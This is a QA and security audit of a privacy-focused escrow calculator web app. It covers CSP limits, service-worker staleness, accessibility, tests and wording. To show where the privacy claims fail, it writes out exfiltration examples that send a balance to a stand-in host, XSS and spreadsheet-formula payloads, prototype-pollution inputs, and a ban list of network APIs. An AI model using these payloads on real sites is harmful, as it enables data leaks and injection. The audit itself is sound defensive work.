# EscrowScope v1 — independent code-level QA audit

Audited: branch `v1` at commit `06c2a77` (2026-09-19). Files were still being committed during the audit; every file:line below is as of that commit. Scope: app shell, service worker, CSS, user-visible strings, shell tests. Not in scope: the math (separate auditor), real-browser behaviour (separate tester), `v0/`.

Method: read every shell file, `npm test` (475/475 pass), scripted source scans, WCAG contrast computed from the CSS hex tokens, hostile-input runs through `pipeline.js`/`engine/money.js` in Node, `curl` against `serve.mjs` on port 4196 (stopped).

Severity: BLOCKER = wrong / unsafe / false claim, or unusable for a disabled user. MAJOR. MINOR.

---

## Defects

### 1. BLOCKER — The "stronger guarantee" claims more than the CSP enforces
- `proof.js:218-219`: "the browser itself refuses any connection this page tries to open. Even if this page's code tried to send your numbers somewhere, the browser would block it."
- `index.html:5-7` (comment, and the panel tells visitors to View Source): "this page cannot open a connection to anywhere, even if its code tried to."
- Same sentence in `docs/SPEC.md` A4 ("could not leak data even if the code tried").

The CSP is exactly what SPEC A4 lists and it does block `fetch`/XHR/WebSocket/EventSource/`sendBeacon`/`<a ping>` and form posts. It does **not** block these, so "even if the code tried" is false:
1. Top-level navigation. CSP has no shipped `navigate-to`. `location.href = "https://x.example/?bal=" + v`, `window.open(...)`, or a scripted `<a>` click all send data in the URL.
2. Same-origin GETs. `img-src 'self'`, `script-src 'self'`, `style-src 'self'`, `manifest-src 'self'`, `worker-src 'self'` allow `new Image().src = "./a.png?bal=" + v`. That request (with the data) reaches GitHub's servers and logs.
3. The service worker. A `<meta>` CSP governs the document, not `sw.js`. A worker's policy comes from its own response headers and GitHub Pages sends none, so `fetch()` inside `sw.js` can reach any origin. Only code review (the shell test) stops that, not the browser.
4. Browser-dependent side channels (`<link rel=dns-prefetch>`, WebRTC) are not covered by `connect-src`.

Fix (wording only, no code change needed). Replace `proof.js:214-220` with:
> "The stronger protection is a rule near the top of this page's code, called a Content-Security-Policy. It includes the line `connect-src 'none'`. In plain words: your browser blocks this page from making background connections to any website. That is the way pages normally send data out without you noticing. It does not stop a link you click from opening another site, and it cannot stop this site's own files from being downloaded. The code on this page never puts your numbers into either of those, and the code is open for anyone to read."

Change the `index.html` comment to "cannot make background connections (fetch, XHR, WebSocket, beacon) to anywhere". Fix SPEC A4 to match.

### 2. BLOCKER — "0: nothing has been sent or fetched" is false on a first visit
`proof.js:273`. The counter reads `performance.getEntriesByType("resource")` for this document (`proof.js:54`). `sw-register.js:31-35` registers the worker *after* `load`; `sw.js:67-78` then fetches all 29 precache URLs (about 620 KB). Those fetches start after `loadEventEnd` and are made by the worker, so they never appear in the page's log. A first-time visitor with DevTools open sees 29 requests next to a green "0: nothing has been sent or fetched". The "What it cannot see" note (`proof.js:205-211`) admits it, but the headline line contradicts the note. The same applies to the browser's own `sw.js` update check on later visits.

Other things the number cannot see (document them, they are not bugs): top-level navigations, `window.open`, anything after the 250-entry resource-timing buffer fills, browser-initiated probes (`/favicon.ico`, `/apple-touch-icon.png` in Safari).

Fix: `"0: this page has not asked the network for anything since it loaded"`, and move the service-worker sentence directly under the number. Rename the label (`proof.js:153`) to "Requests made by this page since it finished loading".

### 3. MAJOR — Other sentences that over-claim
- `index.html:427` "There is no account, no server, and no tracking." GitHub Pages is a server and logs the page load (IP address, browser). Honest: "There is no account and no tracking. The files are hosted on GitHub Pages, which, like any web host, can see that your browser downloaded them. It never sees what you type."
- `index.html:427` "After your first visit it works with the internet turned off." Not true in private windows that refuse service workers, or in Safari versions that predate `worker-src` support (the policy then falls back to `default-src 'none'`, registration is refused, and `sw-register.js:18` swallows it). Add "in most browsers".
- `manifest.webmanifest:4` repeats "nothing you type leaves your device"; fine as implemented, keep it consistent with the wording above.

### 4. MAJOR — Returning visitors can be stuck on stale code forever
`sw.js:18` `CACHE_NAME` is bumped by hand. `sw.js:122-131` is cache-first for every shell file including `index.html`. If a shell file changes and `sw.js` does not, the browser sees a byte-identical worker, never reinstalls, and serves the old files indefinitely. Nothing enforces the bump: `tests/shell.test.js:618-626` only checks the name starts with `escrowscope-` and contains a digit.
Proof from this repo's own history: commits `63e498d` (changed `engine/analyze.js`, a precached file) and `2c6aba6` (changed 3 shell files) both shipped `CACHE_NAME = "escrowscope-v1-2026-09-19a"` with all tests green. The bump to `…19b` only came in `1df0683`.
Fix: in `tests/shell.test.js`, SHA-256 the concatenated contents of every `PRECACHE_URLS` file and require `CACHE_NAME` to end with the first 8 hex characters. The test then fails the moment any shell file changes without a bump (zero deps: `node:crypto`).

### 5. MAJOR — No error boundary: several ways to get a dead page with no message
- No `error` / `unhandledrejection` listener anywhere. `app.js:708` calls `start()` bare.
- `dom.js:66` uses `replaceChildren` (Safari 14+, Chrome 86+). On an older phone the first `clear()` in `start()` throws and the page is a form whose button does nothing. `<noscript>` (`index.html:93`) only covers JS switched off. A 404 on any of the 20 modules has the same result.
- `render.js:563-577` runs 12 render steps with no guard. A throw in `chart.js` leaves the verdict new, the payment/steps/next/letter old, and `setStale(false)` already applied (`app.js:436`).
- `pipeline.js:383` returns the catch-all error with `field: ""`. On a live edit (`app.js:464`, summary hidden) that error has no slot, so the visitor sees "Fix the box marked above" with no box marked.
Fix: put a static paragraph in `index.html` ("If the buttons on this page do nothing, your browser may be too old…") that `start()` hides as its last line; add one `window.addEventListener("error", …)` that un-hides it; wrap each `render*` call in `renderResults` in try/catch; route field-less errors to `#bills-error` or a general slot.

### 6. MAJOR — The letter cannot be edited, and prints with up to seven blanks
- `index.html:373` the textarea is `readonly`; `index.html:359` tells the visitor to "change anything you like".
- `engine/letter.js:90-91` supports `borrowerName` and `propertyAddress`, but the page has no boxes for them, so "[your full name]" (twice), "[your property address]" (twice), the servicer address, "[your phone number or email]" always print.
- `engine/letter.js:116` prints "dated [date on the statement]" even when the visitor typed the analysis date (box 8); `details.analysisDate` is never used by the letter.
- "Print the letter" (`app.js:585`) prints all of that as is.
Fix (smallest): drop `readonly` and stop regenerating once the visitor has edited (or keep `readonly` and change the lede to "Copy it into an email or document, then fill in the parts in [brackets]"). Pass `analysisDate` into the letter.

### 7. MAJOR — "Refund due by <date>" reads as a promise of money
`render.js:174`. SPEC A7: "never promise a refund". The date is 30 days after a date the visitor typed, from numbers the visitor typed, and only if the servicer's own analysis also finds the surplus and payments are current. Fix: eyebrow "If this surplus is right, the 30-day refund window ends".

### 8. MAJOR — WCAG 2.5.3 Label in Name (Level A) fails on a core control
- `app.js:100` sets `aria-label="Remove bill 2"` on a button whose visible text is "Remove this bill" (`app.js:158`). Voice-control users who say "click Remove this bill" get no match.
- `guide.js:212`: every sample-statement button's accessible name ("3. Starting balance, $1,200.00. Go to this box in the form.") omits the visible words on the button ("Beginning Balance …").
Fix: `aria-label="Remove this bill (bill 2)"` or drop the label (the `<fieldset><legend>Bill 2` already gives context). For the guide, start the name with the visible text.

### 9. MAJOR — Shell tests claim more than they check
- `tests/shell.test.js:391-412` is titled "every directive exactly as the spec says" but only checks inclusion (`:404`). Proof: the policy with `; script-src-elem 'self' https://evil.example; frame-src *; font-src https:` appended passes. Fix: `assert.deepEqual(directives.sort(), REQUIRED.sort())`.
- `BANNED_IN_SHELL` (`:39-55`) missed 20 of 20 plain-text probes (obfuscated spellings not counted): `EventSource`, `RTCPeerConnection`, `new Image().src`, `.src =`, `window.open`, `location.href =`, `location.assign`, `import (` with a space or newline (`/\bimport\(/` at `:53`), `fetch (`, `srcdoc`, `createContextualFragment`, `DOMParser`, `setHTMLUnsafe`, `indexedDB`, `new Worker(`, `navigator.share`, `mailto:` hrefs, `setAttribute("href", "javascript:…")`. Add them; use `/\bimport\s*\(/` and `/\bfetch\s*\(/`.
- The `rel="noopener noreferrer"` test (`:520`) reads only `index.html`; links built in `render.js:503,541` are unchecked (they are correct today).
- `CACHE_NAME` test: see defect 4.
- There is no executable test of any DOM module (`app.js`, `render.js`, `chart.js`, `guide.js`, `proof.js`, `selfcheck-ui.js`): focus management, the live region, error wiring and the XSS rule are covered by text scans only.
- Clean: vector tests compare against the research JSON, not against engine output; no empty `expected` blocks (30 vectors, all with 12 table rows); examples are asserted against hard-coded numbers; no skipped/todo/only tests; no assertion-free tests found.

### 10. MINOR — Service worker and deploy
- `sw.js:73` `cache: "reload"` bypasses the browser cache, not GitHub's CDN (`max-age=600`, per file). A new `sw.js` can precache a mix of new and ten-minute-old files under the new name, and that mix then sticks until the next bump. Fix: fetch `url + "?v=" + CACHE_NAME` and `cache.put(plainUrl, response)`.
- After a deploy, a returning visitor still gets the old version for one full visit (cache-first `index.html`, then `skipWaiting` + `clients.claim` swap the cache under the open tab). There is no "new version, reload" note. Safe here because all modules load up front, but say so in the panel or show a note.
- `sw.js:23-24` precaches both `./` and `./index.html`; `shellUrlFor` (`:113-115`) maps the root to `index.html`, so the `./` copy is never read. `sw.js:50-51` precache `assets/favicon.svg` and `assets/logo.svg`, which the page never requests (favicon is a `data:` URI).
- A failed install (one 404 → `addAll` rejects) is silent by design; acceptable, but nothing tells the owner. Consider a line in the privacy panel: "Offline copy: saved / not saved".
- No `.nojekyll`. GitHub Pages will run Jekyll: `docs/research/03-…md` has 16 `{{placeholder}}` tags that render as blanks, and any future file or folder starting with `_` is silently dropped, which would 404 a precache URL and kill offline install. Add an empty `.nojekyll`.
- `manifest.webmanifest:11-18`: the only icon is an SVG `data:` URI (forced by `tests/shell.test.js:773`). Chrome's install prompt needs 192/512 PNG; iOS has no `apple-touch-icon`. Offline still works; "install" does not. Decide and document.
- Old v0.3 visitors: no prior service worker, so nothing to migrate. Clean.
- `manifest` `start_url`/`scope` `"./"`, `sw-register.js` relative URL and scope, all 29 precache paths relative and present, precache list equals the real import graph (20 modules + 4 CSS + html + manifest). Clean.

### 11. MINOR — `serve.mjs` hides or causes problems
- The worker registers on localhost too and is cache-first: edit a file, reload, and the old code runs unless `CACHE_NAME` is bumped. Anyone testing in a browser during the build may be looking at stale code. Add a `localhost` bypass in `sw-register.js` or a `?nosw` switch.
- It serves from `/`, not `/escrowscope/`, so a stray absolute path would not show up locally (none exist today; the shell test covers it).
- `Cache-Control: no-store` (`:39`) means HTTP-cache skew between `index.html` and modules (up to 10 minutes on GitHub Pages for browsers without a service worker) cannot be reproduced locally.
- `serve.mjs:26`: `GET /%` throws `URIError` inside the async handler and kills the process (reproduced: curl returned 000 and the server was gone). `:29` `startsWith(ROOT)` has no trailing separator, so a sibling folder named `escrowscope-v1…` would pass the traversal check. Dev-only, bound to 127.0.0.1.

### 12. MINOR — Accessibility
- `index.html:107`: the error summary is `role="alert"` and also receives focus (`app.js:413`), so most screen readers read it twice. Drop `role="alert"` (focus + `aria-labelledby` is enough).
- Live what-if: a pause mid-number ("1," or "1,2" while typing 1,234) is a parse error, so the box flashes invalid and the live region says "One of the boxes has a problem" (`render.js:589`), then "Updated…" a moment later. Treat a trailing comma/partial group as "still typing" or lengthen the delay for invalid states.
- `index.html:216,222`: `#bills-hint` and `#bills-error` are not referenced by any `aria-describedby`. With zero rows the error link focuses "Add another bill" and the message is never read. Add `aria-describedby="bills-hint bills-error"` to `#bills-fieldset` and `#add-bill`.
- `styles.css` and `selfcheck.css` have no `forced-colors` block (`chart.css`, `guide.css` do). Verdict, chips and errors survive because they carry text and icons; the pressed state of an example card (`styles.css:568`, tint + 1px shadow only) and `.choice:has(input:checked)` styling disappear. Add `outline: 2px solid Highlight` for `[aria-pressed="true"]`.
- `app.js:497`: an example card stays `aria-pressed="true"` after the visitor edits the numbers. Clear it on the first `input` event.
- About 17 `region` landmarks (every `section[aria-labelledby]` plus two scroll regions). Drop `aria-labelledby` from the seven `result-block` sections; the h3s already give structure.
- `styles.css:63-65`: all type tokens are `px`, so a visitor's browser default font size is ignored (zoom still works, so 1.4.4 passes). `--text-micro: 12px` is small for this audience. Use `rem`.
- `app.js:640`: "Clear the form" wipes everything with one click, sits next to the primary button, has no undo and no spoken confirmation. Add a status line ("Form cleared") and either a confirm or an undo.
- `app.js:67-72`: the required "First month" box is pre-filled with a guess (next month), per SPEC B2. A wrong guess changes the low point silently. Show "We guessed this. Check it against your statement" until the visitor touches it.
- Error-summary links and "Go to that box" links are about 34px tall, under the project's own 44px bar (inline links are exempt from WCAG 2.5.8).
- Contrast (computed, both themes): every text pair passes 4.5:1 and every input border / focus ring passes 3:1. Tightest pairs: amber `#B45309` on `#FEF3C7` = 4.51:1 (status chips, verdict label; zero headroom), `#64748B` border on `#F8FAFC` = 4.55:1. Below 3:1 but decorative only: hairline `#E2E8F0` on white 1.23:1 (card and table rules), privacy-chip border on the masthead 2.36:1 light / 2.55:1 dark, amber mark `#F59E0B` on `#FEF3C7` 1.93:1 (the glyph on it is 8.3:1). No placeholder text is used anywhere.

### 13. MINOR — Robustness
- Loaded numbers file: a bad `claimedKind`, `startMonth`, bill `month`, `cushionMonths` or `analysisDate` is dropped silently by the `<select>`/`<input type=date>` when `writeFormValues` sets `.value` (`app.js:264-276`), then the status says "Loaded your numbers from the file." The value never reaches validation. Compare what was written with what the control kept and say which boxes could not be restored.
- Name length limits disagree: 60 typed (`app.js:131`), 100 in `engine/validate.js:18`, 120 from a file (`pipeline.js:415`), 200 in the letter. A 101-120 character name from a file fails validation and the message lands under the "What it is" select (`app.js:340`), not the name box.
- Loading an invalid file after a good check leaves the previous scenario's results on screen under "These results are from your last valid numbers" while the form shows the file's numbers. Hide the results when a load fails validation.
- No `beforeunload` guard. A reload, or a phone discarding the tab while the visitor switches to their statement PDF, loses every number. A guard needs no storage.
- `app.js:546`: the clipboard fallback uses `select()` on a read-only textarea, which does not select on iOS Safari; use `setSelectionRange(0, value.length)` as well.
- Printed report hides `.flag-list` and `.block-note` (`styles.css:2077-2078`): the counselor sees "Over the limit" chips without the sentence that explains them.
- The page can be framed by any site (`frame-ancestors` cannot be set from a `<meta>` CSP and GitHub Pages sends no headers). A wrapper could show our privacy chip above its own overlay. Add `if (window.top !== window.self)` → show a warning and disable the form.

### 14. MINOR — Plain language and tone
- Voice flips between "this page" and "we/us/our": `engine/explain.js:66,97` "You told us…", `:71` "By our math", `:278` "We round…", `engine/validate.js:85,232` "Tell us yes or no". On a page whose promise is that nobody is told anything, "You told us" is the wrong phrase. Use "You ticked…" / "this page".
- `index.html:342` "Your lawful payment" sounds like a legal conclusion. Use "The payment the federal math gives".
- One thing, several names: "monthly escrow payment" (form), "Escrow Deposit" (alias), "Paid in" (`chart.js:992`), "Base payment" (`render.js`), "12-month period" / "escrow year" / "computation year" / "the next 12 months". Pick "escrow payment" and "the next 12 months" and use them everywhere outside the alias lists.
- `engine/money.js` error "Use digits only, like 1234.50" contradicts the form lede "Type dollar amounts like 1,234.56" (`index.html:105`). Commas are accepted; say so.
- `README.md:9-14,21` is the v0.3 README: it says to run `node check.js`, says the math is sometimes "wrong in the servicer's favor" and that the tool "tells you if you're being over-collected". The page links to this repo as its source. Rewrite for v1 in the page's neutral voice.
- Clean: every critical-path term (escrow, servicer, cushion, shortage, surplus, deficiency) is defined where it first appears; validation messages say how to fix the problem and never echo typed text; flags are worded as questions; "Honest limits" is always visible directly after the results (`index.html:390-402`); the letter carries its "arithmetic, not legal conclusions" line.

---

## Checked and clean
- XSS: no `innerHTML`/`outerHTML`/`insertAdjacentHTML`/`document.write`/`DOMParser`/`createContextualFragment`/`srcdoc`/`eval`/`new Function`/dynamic `import` in any shell file. All DOM goes through `dom.js` (`textContent`, `setAttribute`, refuses `style` and `on*`). No `.style` writes. Every `href` built in JS is a constant from the engine, a `#id`, `tel:` digits, or a `blob:` URL; none carries typed text.
- Hostile input run through the real pipeline: bill name `<img src=x onerror=alert(1)>"'` + template syntax, servicer name with newline + `</textarea><script>` + 5,000 characters, loan number `=HYPERLINK(...)`. All stay plain text; the letter flattens line breaks and caps at 200 characters.
- Numbers file: `JSON.parse` + own-key copy of a fixed key list, so `__proto__`/`constructor` payloads do nothing (verified `({}).polluted === undefined`); objects/arrays/booleans in value positions become `""`; 24-row cap; 100,000-character cap (a 10,000-bill file is rejected); values re-enter through the same form → `readInputs` → `validateAccount` path as typed input. Download filename is a constant; content is `JSON.stringify` of capped strings and excludes servicer name and loan number.
- Size/DoS: `parseDollars` on 5 MB strings returns in under 100 ms; `1e308`, `Infinity`, `NaN`, hex, full-width and Arabic digits, NBSP and apostrophe separators are rejected with a fix-it message; `$1,234.56`, `" 1200 "`, `1200.5`, `1200.`, `(500)`, unicode minus all parse; `-0` parses to `0`, not `-0`; `1.234,56` is rejected with a message.
- CSP: first element in `<head>` after `<meta charset>`, before every `<link>`/`<script>`; exactly the nine SPEC A4 directives, no `unsafe-*`; no inline script, style, or handler in `index.html`; nothing in the shell needs a forbidden source (no `data:` fonts, no CSS `url()`, SVG uses presentation attributes only, manifest and worker are same-origin). `blob:` download is a navigation, which CSP does not govern in Chrome/Firefox; Safari needs the browser tester's confirmation.
- External links: all four in `index.html` and both builders in `render.js` carry `rel="noopener noreferrer"`; `<meta name="referrer" content="no-referrer">` is present. No `mailto:` link, no `ping`, no prefetch hints, no `window.open`.
- No storage of any kind outside `sw.js`'s Cache API; `sw.js` answers same-origin GETs for listed files only, has no `message` listener and no absolute URLs.
- Form: `type="text"` + `inputmode="decimal"` on money (not `type=number`); every control has a `<label for>`; groups use `fieldset/legend`; hints and error slots wired with `aria-describedby`; `aria-invalid` set and cleared; `aria-required` on required boxes; error summary links move focus into the box and open a closed `<details>`; add/remove bill moves focus sensibly and renumbers; Enter in a bill row submits the check; removing the last row is handled; `lang="en"`; skip link; heading levels never skip; `:focus-visible` ring 3px everywhere plus `[tabindex="-1"]:focus`; both animations sit inside `prefers-reduced-motion: no-preference`; scripted scrolls are instant; dark theme via `prefers-color-scheme`.
- Live region: only `#verdict-live` speaks on live edits; the first check moves focus to the verdict heading instead (no double announcement); the bills total and the request counter are deliberately not live.
- Chart: `role="img"` with `<title>`/`<desc>`, all drawing groups `aria-hidden`, real table alternative with caption and `th scope`, lowest month marked with words, textures as well as colour, zero line always in range, all-zero input gets a $100 axis, non-finite values coerced to 0.
- Reflow: no fixed page widths; wide tables scroll inside focusable `role="region"` boxes; body has `overflow-wrap: break-word`; vw-based font sizes are all `clamp()`ed with px/rem bounds.
- State: debounce timer cleared on check, clear and file load; example switch always replaces results and clears the letter fields; open "Show the math" steps survive live re-renders; print restores step state on `afterprint`.

## Not verifiable from code (for the browser tester)
`blob:` download under this CSP in Safari; whether Chrome logs the manifest fetch after `load`; verdict figure at 320px with 8+ digit amounts; iOS `select()` fallback; forced-colors rendering of the summary "+" icons.
